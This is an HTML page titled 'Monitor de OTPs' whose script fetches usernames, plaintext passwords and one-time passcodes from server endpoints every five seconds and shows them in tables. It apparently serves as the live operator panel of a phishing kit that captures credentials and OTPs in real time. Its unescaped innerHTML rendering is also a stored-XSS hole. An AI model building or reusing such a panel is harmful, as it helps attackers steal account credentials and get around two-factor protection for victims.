<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Monitor de OTPs</title>
  <style>
    body { font-family: Arial, sans-serif; padding: 20px; }
    table { border-collapse: collapse; width: 100%; }
    th, td { border: 1px solid #ccc; padding: 8px; text-align: left; }
    th { background-color: #f4f4f4; }
  </style>
</head>
<body>

<h1>Consulta de usuarios</h1>
<table id="tabla-usuarios">
  <thead>
    <tr>
      <th>Usuario</th>
      <th>Clave</th>
      <th>Fecha de registro</th>
    </tr>
  </thead>
  <tbody></tbody>
</table>

 <h1>Registros consolidados</h1>
<table id="tabla-consolidada">
  <thead>
    <tr>
      <th>Usuario</th>
      <th>Clave</th>
      <th>OTP</th>
      <th>Fecha</th>
    </tr>
  </thead>
  <tbody></tbody>
</table>



  <script>

      async function cargarUsuarios() {
    try {
      const res = await fetch('/ver-usuarios');
      const datos = await res.json();
      const tbody = document.querySelector('#tabla-usuarios tbody');
      tbody.innerHTML = '';

      datos.forEach(usuario => {
        const fila = document.createElement('tr');
        fila.innerHTML = `
          <td>${usuario.usuario}</td>
          <td>${usuario.clave}</td>
          <td>${usuario.creado_en}</td>
        `;
        tbody.appendChild(fila);
      });
    } catch (error) {
      console.error('Error al cargar usuarios:', error);
    }
  }

  async function cargarConsolidado() {
  const res = await fetch('/ver-consolidado');
  const datos = await res.json();
  const tbody = document.querySelector('#tabla-consolidada tbody');
  tbody.innerHTML = '';

  datos.forEach(registro => {
    const fila = document.createElement('tr');
    fila.innerHTML = `
      <td>${registro.usuario}</td>
      <td>${registro.clave}</td>
      <td>${registro.otp}</td>
      <td>${registro.creado_en}</td>
    `;
    tbody.appendChild(fila);
  });
}



cargarUsuarios();
cargarConsolidado();
setInterval(() => {
    cargarUsuarios();
    cargarConsolidado();
  }, 5000);

  </script>
</body>
</html>
